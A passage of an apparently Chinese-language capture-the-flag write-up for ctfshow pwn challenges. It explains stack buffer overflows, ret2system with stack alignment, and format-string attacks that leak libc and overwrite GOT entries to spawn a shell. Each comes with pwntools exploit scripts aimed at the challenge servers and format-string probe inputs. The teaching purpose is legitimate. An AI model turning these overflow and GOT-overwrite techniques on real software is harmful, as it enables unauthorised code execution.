		class="gallery-image" 
		data-flex-grow="390"
		data-flex-basis="936px"
	
></p>
<h2 id="pwn36">pwn36
</h2><p>仅开了RELRO</p>
<p>危险函数gets()函数</p>
<p><img src="/p/ctfshow-pwn/image-20250302180333090.png"
	width="704"
	height="231"
	srcset="/p/ctfshow-pwn/image-20250302180333090_hu_67bb355bf5f6e0f.png 480w, /p/ctfshow-pwn/image-20250302180333090_hu_f017ab0b0bce32fb.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="304"
		data-flex-basis="731px"
	
></p>
<p>题目说了，利用后门函数，找到get_flag函数的位置，和偏移量0x28，ebp在s上面0x28处</p>
<p>栈结构</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">                                           +-----------------+
</span></span><span class="line"><span class="cl">                                           |     retaddr     |
</span></span><span class="line"><span class="cl">                                           +-----------------+
</span></span><span class="line"><span class="cl">                                           |     saved ebp   |
</span></span><span class="line"><span class="cl">                                    ebp---&gt;+-----------------+
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                              s,ebp-0x14--&gt;+-----------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>覆盖后</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">                                           +-----------------+
</span></span><span class="line"><span class="cl">                                           |    0x0804843B   |
</span></span><span class="line"><span class="cl">                                           +-----------------+
</span></span><span class="line"><span class="cl">                                           |       bbbb      |
</span></span><span class="line"><span class="cl">                                    ebp---&gt;+-----------------+
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                                           |                 |
</span></span><span class="line"><span class="cl">                              s,ebp-0x14--&gt;+-----------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28197</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span><span class="mh">0x28</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag_address</span> <span class="o">=</span> <span class="mh">0x08048586</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;bbbb&#39;</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">flag_address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn37">pwn37
</h2><p>system(&quot;/bin/sh&quot;)调用默认shell来传入命令字符串，和上面一样</p>
<h2 id="pwn38">pwn38
</h2><p>64位，注意堆栈平衡！</p>
<p>可以直接用gdb看汇编代码</p>
<p>gdb pwn</p>
<p>disass backdoor</p>
<p>cyclic 200</p>
<p>填充字符串</p>
<p><img src="/p/ctfshow-pwn/image-20250302200421128.png"
	width="2323"
	height="752"
	srcset="/p/ctfshow-pwn/image-20250302200421128_hu_ac9d010907800739.png 480w, /p/ctfshow-pwn/image-20250302200421128_hu_ea0ae523849d4168.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="308"
		data-flex-basis="741px"
	
></p>
<p>cyclic -l 地址</p>
<p>看偏移，偏移量最后要加8（堆栈平衡）</p>
<p>IDA中找ret地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="s2">&#34;28220&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0xa</span> <span class="o">+</span> <span class="mh">0x8</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0x0000000000400287</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">backdoor_addr</span> <span class="o">=</span> <span class="mh">0x0000000000400657</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn39">pwn39
</h2><p>没有后门函数，但是有hint</p>
<p><img src="C:%5cUsers%5c%e6%b0%b4%e8%8d%89%e5%a7%90%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250302202433344.png"
	
	
	
	loading="lazy"
	
		alt="image-20250302202433344"
	
	
></p>
<p>得到偏移量</p>
<p><img src="/p/ctfshow-pwn/image-20250302201846192.png"
	width="2269"
	height="157"
	srcset="/p/ctfshow-pwn/image-20250302201846192_hu_75fb21304c7ff7d5.png 480w, /p/ctfshow-pwn/image-20250302201846192_hu_7e1dc2da6c80ea9f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="1445"
		data-flex-basis="3468px"
	
></p>
<p>拿到/bin/sh的地址</p>
<p><img src="/p/ctfshow-pwn/image-20250302201816379.png"
	width="1651"
	height="316"
	srcset="/p/ctfshow-pwn/image-20250302201816379_hu_5a861246d1420afe.png 480w, /p/ctfshow-pwn/image-20250302201816379_hu_64d9aa6b1a90dca1.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="522"
		data-flex-basis="1253px"
	
></p>
<p>拿到system的地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">objdump -d -j .plt pwn
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn/image-20250302201917309.png"
	width="2061"
	height="1053"
	srcset="/p/ctfshow-pwn/image-20250302201917309_hu_1cf55e8384c99b51.png 480w, /p/ctfshow-pwn/image-20250302201917309_hu_379509f04d0fecc8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="195"
		data-flex-basis="469px"
	
></p>
<p>查看IDA也可</p>
<p><img src="/p/ctfshow-pwn/image-20250302202604110.png"
	width="1946"
	height="741"
	srcset="/p/ctfshow-pwn/image-20250302202604110_hu_1801f4ee18b486e4.png 480w, /p/ctfshow-pwn/image-20250302202604110_hu_3f58237f4c71ed38.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="262"
		data-flex-basis="630px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="s2">&#34;28241&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">22</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="mh">0x08048750</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x080483a0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span><span class="sa">b</span><span class="s1">&#39;bbbb&#39;</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>补充一下：代表是system函数的返回地址，由于不需要返回到某个地方，所以直接使用bbbb代替四个字节</p>
<h2 id="pwn94">pwn94
</h2><p>找到格式化字符串的位置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">aaaa-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x
</span></span><span class="line"><span class="cl">aaaa-ff9474a8-64-80486e5-1-0-61616161-2d78252d-252d7825-78252d78-2d78252d-252d7825
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><code>aaaa</code>：这是一个固定的字符串，用于在栈上标记一个已知值（<code>0x61616161</code>，即<code>aaaa</code>的ASCII码）。</li>
<li><code>-%x</code>：<code>%x</code>是格式化字符串中的占位符，用于以十六进制格式打印栈上的值。</li>
</ul>
<p>验证：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">aaaa%6$p
</span></span><span class="line"><span class="cl">aaaa0x61616161
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>%6$p</code>：这是一个格式化字符串占位符，表示打印栈上第6个位置的值（以指针格式）。</p>
<p>拖进IDA反汇编，发现有sys函数</p>
<p><img src="/p/ctfshow-pwn/image-20250303025027479.png"
	width="658"
	height="173"
	srcset="/p/ctfshow-pwn/image-20250303025027479_hu_8a8dec31e6fa8d.png 480w, /p/ctfshow-pwn/image-20250303025027479_hu_5ba06436f715c860.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="380"
		data-flex-basis="912px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./fmt&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28124</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl"><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">system_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,{</span><span class="n">printf_got</span><span class="p">:</span><span class="n">system_plt</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong><code>printf_got = elf.got['printf']</code></strong>:</p>
<ul>
<li>获取<code>printf</code>函数在GOT（Global Offset Table）中的地址。GOT表用于存储动态链接函数的实际地址。</li>
</ul>
<p><strong><code>system_plt = elf.plt['system']</code></strong>:</p>
<ul>
<li>获取<code>system</code>函数在PLT（Procedure Linkage Table）中的地址。PLT表用于调用动态链接的函数。</li>
</ul>
<p><strong><code>payload = fmtstr_payload(offset, {printf_got: system_plt})</code></strong>:</p>
<ul>
<li>使用<code>pwntools</code>的<code>fmtstr_payload</code>函数生成一个格式化字符串漏洞的利用载荷。这个载荷会将<code>printf</code>函数的GOT表项修改为<code>system</code>函数的地址。</li>
<li><code>offset</code>是格式化字符串的偏移量。</li>
<li><code>{printf_got: system_plt}</code>表示将<code>printf_got</code>地址处的值修改为<code>system_plt</code>。</li>
</ul>
<p><code>io.sendline('/bin/sh\x00')</code>**:</p>
<ul>
<li>发送字符串<code>/bin/sh</code>给目标程序。由于<code>printf</code>的GOT表项已经被修改为<code>system</code>，因此当程序调用<code>printf</code>时，实际上会调用<code>system('/bin/sh')</code>，从而启动一个shell。</li>
</ul>
<h2 id="pwn95">pwn95
</h2><p>与上一道题目不一样，没有了sys函数，需要去泄露libc，然后再修改GOT</p>
<p>自动检测字符串偏移量</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exec_fmt</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">info</span>
</span></span><span class="line"><span class="cl"><span class="n">auto</span> <span class="o">=</span> <span class="n">FmtStr</span><span class="p">(</span><span class="n">exec_fmt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="n">auto</span><span class="o">.</span><span class="n">offset</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28291</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exec_fmt</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">info</span>
</span></span><span class="line"><span class="cl"><span class="n">auto</span> <span class="o">=</span> <span class="n">FmtStr</span><span class="p">(</span><span class="n">exec_fmt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="n">auto</span><span class="o">.</span><span class="n">offset</span>
</span></span><span class="line"><span class="cl"><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="s1">&#39;%{}$s&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">printf</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">4</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">printf</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;system ===&gt; </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span>    <span class="err">通过</span><span class="n">printf函数的实际地址和libc库中的符号偏移量</span><span class="err">，计算出</span><span class="n">system函数的地址</span><span class="err">。</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span>        <span class="n">printf</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span><span class="err">：计算</span><span class="n">libc库的基地址</span><span class="err">。</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span>      <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span><span class="err">：加上</span><span class="n">system函数的偏移量</span><span class="err">，得到</span><span class="n">system函数的实际地址</span><span class="err">。</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span>  <span class="err">使用</span><span class="nb">log</span><span class="o">.</span><span class="n">info输出system函数的地址</span><span class="err">。</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,{</span><span class="n">printf_got</span><span class="p">:</span><span class="n">system</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">使用</span><span class="n">pwntools的fmtstr_payload函数生成一个格式化字符串漏洞的利用载荷</span><span class="err">。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span>   <span class="n">offset</span><span class="err">：格式化字符串的偏移量。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="o">//</span>  <span class="p">{</span><span class="n">printf_got</span><span class="p">:</span> <span class="n">system</span><span class="p">}</span><span class="err">：将</span><span class="n">printf_got地址处的值修改为system函数的地址</span><span class="err">。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">发送载荷，触发格式化字符串漏洞，修改</span><span class="n">printf的GOT表项为system函数的地址</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn96">pwn96
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> fgets(s, 64, stdin);//读取用户输入，最多64字节
</span></span><span class="line"><span class="cl"> printf(s);//这一行直接将用户控制的输入 s 作为 printf 的格式字符串。这是一个经典的格式字符串漏洞。攻击者可以通过在他们的输入中提供格式说明符（例如， %x 、 %s 、 %n ）来利用它：
</span></span></code></pre></td></tr></table>
</div>
</div><p>为了修复这个漏洞，在调用 <code>printf</code> 时始终使用格式化字符串</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">printf(&#34;%s&#34;, s);
</span></span></code></pre></td></tr></table>
</div>
</div><p>ctfshow{&quot; 开头,转换为16进制就是 63 74 66 73 68</p>
<p>6f 77 7b</p>
<p>然后倒序就是 0x73667463 0x7b776f68,</p>
<p><img src="/p/ctfshow-pwn/image-20250303171233254.png"
	width="1835"
	height="98"
	srcset="/p/ctfshow-pwn/image-20250303171233254_hu_43ecc0cd987bc7d2.png 480w, /p/ctfshow-pwn/image-20250303171233254_hu_3c93b6284ecea5a1.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="1872"
		data-flex-basis="4493px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">EXP</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;泄露栈中的字符串&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
